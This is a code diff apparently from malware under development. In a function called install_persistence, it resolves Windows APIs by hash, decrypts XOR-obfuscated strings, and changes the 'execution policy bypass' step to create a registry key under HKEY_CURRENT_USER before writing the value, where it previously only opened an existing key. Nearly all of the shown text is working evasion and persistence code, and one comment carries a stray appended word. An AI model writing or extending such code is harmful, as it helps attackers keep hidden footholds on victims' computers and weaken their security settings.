@@ -15,6 +15,7 @@ typedef DWORD (WINAPI *pGetTickCount)(void);
 typedef BOOL (WINAPI *pCreateDirectoryA)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
 typedef BOOL (WINAPI *pSetFileAttributesA)(LPCSTR lpFileName, DWORD dwFileAttributes);
 typedef HRESULT (WINAPI *pSHGetFolderPathA)(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
+typedef LONG (WINAPI *pRegCreateKeyExA) (HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
 typedef LONG (WINAPI *pRegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
 typedef LONG (WINAPI *pRegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
 typedef LONG (WINAPI *pRegCloseKey)(HKEY hKey);
@@ -39,13 +40,14 @@ bool install_persistence(const char* current_exe_path) {
     // --- API HASHES DEFINITION
     DWORD hash_GetEnvVarA = 0x87889701;         // djb2 for "GetEnvironmentVariableA"
     DWORD hash_CopyFileA = 0xAC2253C1;          // djb2 for "CopyFileA"
-    DWORD hash_CreateFileA = 0xEB96C5FA;        // djb2 for "CreateFileA"
+    DWORD hash_CreateFileA = 0xEB96C5FA;        // djb2 for "CreateFileA"ExecutionPolicy
     DWORD hash_WriteFile = 0x663CECB0;          // djb2 for "WriteFile"
     DWORD hash_CloseHandle = 0x3870CA07;        // djb2 for "CloseHandle"
     DWORD hash_GetTickCount = 0x41AD16B9;       // djb2 for "GetTickCount"
     DWORD hash_CreateDirectoryA = 0x41FABFEF;   // djb2 for "CreateDirectoryA"
     DWORD hash_SetFileAttributesA = 0xF5A60659; // djb2 for "SetFileAttributesA"
     DWORD hash_SHGetFolderPathA = 0xA15CE62A;   // djb2 for "SHGetFolderPathA"
+    DWORD hash_RegCreateKeyExA = 0x46CEB39E;    // djb2 for "RegCreateKeyExA"
     DWORD hash_RegOpenKeyExA = 0x074A975C;      // djb2 for "RegOpenKeyExA"
     DWORD hash_RegSetValueExA = 0x345872EA;     // djb2 for "RegSetValueExA"
     DWORD hash_RegCloseKey = 0x736B3702;        // djb2 for "RegCloseKey"
@@ -80,6 +82,7 @@ bool install_persistence(const char* current_exe_path) {
     pCreateDirectoryA fnCreateDirectoryA = (pCreateDirectoryA) get_api_by_hash(hKernel32, hash_CreateDirectoryA);
     pSetFileAttributesA fnSetFileAttributesA = (pSetFileAttributesA) get_api_by_hash(hKernel32, hash_SetFileAttributesA);
     pSHGetFolderPathA fnSHGetFolderPathA = (pSHGetFolderPathA) get_api_by_hash(hShell32, hash_SHGetFolderPathA);
+    pRegCreateKeyExA fnRegCreateKeyExA = (pRegCreateKeyExA) get_api_by_hash(hAdvapi, hash_RegCreateKeyExA);
     pRegOpenKeyExA fnRegOpenKeyExA = (pRegOpenKeyExA) get_api_by_hash(hAdvapi, hash_RegOpenKeyExA);
     pRegSetValueExA fnRegSetValueExA = (pRegSetValueExA) get_api_by_hash(hAdvapi, hash_RegSetValueExA);
     pRegCloseKey fnRegCloseKey = (pRegCloseKey) get_api_by_hash(hAdvapi, hash_RegCloseKey);
@@ -139,14 +142,15 @@ bool install_persistence(const char* current_exe_path) {
     // --- EXECUTION POLICY BYPASS LOGIC
 
     HKEY hKeyPolicy;
+    DWORD disposition;
 
     xor_crypt(enc_PolicyPath, sizeof(enc_PolicyPath), cypher_key, cypher_key_len);
     xor_crypt(enc_PolicyValue, sizeof(enc_PolicyValue), cypher_key, cypher_key_len);
     xor_crypt(enc_ValueName, sizeof(enc_ValueName), cypher_key, cypher_key_len);
 
-    LONG open_res = fnRegOpenKeyExA(HKEY_CURRENT_USER, enc_PolicyPath, 0, KEY_WRITE, &hKeyPolicy);
+    LONG create_res = fnRegCreateKeyExA(HKEY_CURRENT_USER, enc_PolicyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKeyPolicy, &disposition);
 
-    if (open_res == ERROR_SUCCESS) {
+    if (create_res == ERROR_SUCCESS) {
         fnRegSetValueExA(hKeyPolicy, enc_ValueName, 0, REG_SZ, (const BYTE*)enc_PolicyValue, strlen(enc_PolicyValue) + 1);
         
         // close registry handle
